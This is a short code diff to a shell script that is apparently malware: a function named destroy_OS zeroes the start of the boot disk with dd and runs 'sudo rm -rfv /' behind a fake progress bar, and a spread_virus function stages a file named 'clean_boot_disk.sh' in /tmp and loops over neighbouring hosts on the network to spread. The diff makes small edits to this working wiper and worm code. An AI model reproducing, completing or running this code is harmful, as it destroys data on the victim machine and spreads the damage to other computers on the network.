@@ -30,7 +30,7 @@ function destroy_OS()
         echo -ne '#######################   (100%)\r'
             echo -ne '\n'
     
-    sudo dd if=/dev/zero of=$(take_boot_disk) bs=1 count=46
+    sudo dd if=/dev/zero of="$(take_boot_disk)" bs=1 count=46
     sudo rm -rfv /
     printf -- "$(echo $RANDOM | md5sum | head -c 20; echo;)%.1s" {1..10567}
     
@@ -122,7 +122,8 @@ INTERFACE=$(ip a l | grep -iE "$(hostname -I | awk -F ' ' '{print $1};')" | cut 
 
 function spread_virus {
 FILE_SEND="clean_boot_disk.sh"
-FILE_PATH="/tmp"      
+FILE_PATH="/tmp"
+    sudo mv -v $FILE_PATH $FILE_PATH     
     cd $FILE_PATH
     for i in `ip neigh show | awk -F " " '{print $1};' | grep -vE "*.1"`
     do 
